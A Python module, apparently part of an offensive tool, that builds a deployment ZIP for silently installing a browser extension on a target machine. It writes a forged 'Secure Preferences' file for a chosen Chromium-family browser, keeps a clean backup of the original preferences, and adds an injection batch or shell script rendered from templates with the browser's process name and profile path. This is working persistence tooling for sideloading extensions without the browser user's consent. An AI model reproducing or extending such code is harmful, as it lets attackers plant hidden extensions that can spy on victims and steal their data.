import datetime
import os
import json
import tempfile
import shutil
import base64
import zipfile

# Local modules
from .browser_config import BrowserConfigurator
from .builder import build_secure_preferences
from .crypto import generate_extension_keys
from .manifest import key_to_crx_id

INJECT_BAT_TEMPLATE_PATH = os.path.join(os.path.dirname(__file__), "inject.bat.template")
INJECT_SH_TEMPLATE_PATH = os.path.join(os.path.dirname(__file__), "inject.sh.template")

def package(
    extension_dir: str,
    prefs_file: str,
    device_id: str,
    target_dir: str,
    browser_id: str,
    platform: str = "windows",
    output_dir: str | None = None,
    debug: bool = False,
) -> str | None:
    """
    Build the full deployment ZIP.

    Returns the path to the final ZIP, or None on failure.
    """
    # __ Validate inputs ____________________________________________
    if not os.path.exists(prefs_file):
        print(f"[-] Preferences file not found: {prefs_file}")
        return None
    if not os.path.isdir(extension_dir):
        print(f"[-] Extension directory not found: {extension_dir}")
        return None

    manifest_path = os.path.join(extension_dir, "manifest.json")
    if not os.path.exists(manifest_path):
        print("[-] manifest.json not found in extension directory")
        return None

    cfg = BrowserConfigurator.get_browser_configs(platform).get(browser_id)
    if cfg is None:
        print(f"[-] Unknown browser: {browser_id}")
        return None
    # if not cfg.seed:
    #     print(f"[-] Seed not configured for {cfg.name} - cannot compute HMAC")
    #     return None


    with open(manifest_path, "r", encoding="utf-8") as f:
        manifest = json.load(f)

    # __ Derive / generate extension ID _______________________________
    if manifest.get("key"):
        key_bytes = base64.b64decode(manifest["key"])
        crx_id = key_to_crx_id(key_bytes)
        print(f"[*] Using existing key from manifest  ->  ID: {crx_id}")
    else:
        crx_id, pub_key, _ = generate_extension_keys()
        manifest["key"] = pub_key
        # Write it back so the extension folder on disk is consistent
        with open(manifest_path, "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2, ensure_ascii=False)
        print(f"[*] Generated new extension ID: {crx_id}")

    # Normalize target dir — use the correct path separator for the target OS
    sep = "\\" if platform == "windows" else "/"
    wrong_sep = "/" if platform == "windows" else "\\"
    target_dir = target_dir.replace(wrong_sep, sep).rstrip(sep)
    extension_name = os.path.basename(extension_dir.rstrip("/\\"))
    deploy_path = f"{target_dir}{sep}{extension_name}"
    print(f"[*] Deploy path on target ({platform}): {deploy_path}")

    with open(prefs_file, "r", encoding="utf-8") as f:
        prefs_content = f.read()

    timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M")
    output_filename = f"{extension_name}_spf_{timestamp}"
    final_zip = os.path.join(output_dir or ".", output_filename + "_deploy.zip")

    print(f"[*] Generating Secure Preferences for {cfg.name} ...")

    try:
        spf_bytes = build_secure_preferences(
            prefs_content=prefs_content,
            crx_id=crx_id,
            deploy_path=deploy_path,
            manifest=manifest,
            device_id=device_id,
            browser_id=browser_id,
        )
    except Exception as e:
        print(f"[-] Failed to build Secure Preferences: {e}")
        if debug:
            import traceback
            traceback.print_exc()
        return None

    with tempfile.TemporaryDirectory() as tmp:
        # extension/
        ext_dst = os.path.join(tmp, "extension", extension_name)
        shutil.copytree(extension_dir, ext_dst)
        with open(os.path.join(ext_dst, "manifest.json"), "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2, ensure_ascii=False)

        # Secure Preferences at ZIP root
        with open(os.path.join(tmp, "Secure Preferences"), "wb") as f:
            f.write(spf_bytes)

        # Injection script - platform-aware
        script_content = render_inject_script(cfg, target_dir, platform)
        if platform == "windows":
            script_name = "inject.bat"
        else:
            script_name = "inject.sh"

        if script_content:
            script_path = os.path.join(tmp, script_name)
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)
            if platform != "windows":
                os.chmod(script_path, 0o755)
            print(f"[+] {script_name} generated")
        else:
            print(f"[~] {script_name} skipped (template not found)")


        # Original prefs backup
        shutil.copy2(prefs_file, os.path.join(tmp, "SecurePreferencesClean"))

        # info.json
        info = {
            "extension_id": crx_id,
            "timestamp": timestamp,
            "device_id": device_id,
            "browser": cfg.name,
            "platform": platform,
            "secure_preferences_path": cfg.secure_preferences_path,
            "extension": {
                "name": extension_name,
                "local_path": extension_dir,
                "deploy_path": deploy_path,
            },
        }
        with open(os.path.join(tmp, "info.json"), "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2)

        with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_DEFLATED) as zout:
            for root, _, files in os.walk(tmp):
                for fname in files:
                    fpath   = os.path.join(root, fname)
                    arcname = os.path.relpath(fpath, tmp)
                    zout.write(fpath, arcname)

    print(f"\n[+] ZIP created: {final_zip}")
    return final_zip


def render_inject_script(cfg, target_dir: str, platform: str) -> str | None:
    """
    Read the appropriate injection template for the target platform
    and replace placeholders with the given BrowserConfig values.
    """
    if platform == "windows":
        template_path = INJECT_BAT_TEMPLATE_PATH
    else:
        template_path = INJECT_SH_TEMPLATE_PATH

    if not os.path.exists(template_path):
        print(f"[-] Injection template not found at {template_path}")
        return None

    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    content = content.replace("{{BROWSER_NAME}}", cfg.name)
    content = content.replace("{{BROWSER_PROC_NAME}}", cfg.proc_name)
    content = content.replace("{{BROWSER_PROFILE_PATH}}", cfg.profile_path)
    content = content.replace("{{BROWSER_TARGET_DIR}}", target_dir)

    return content
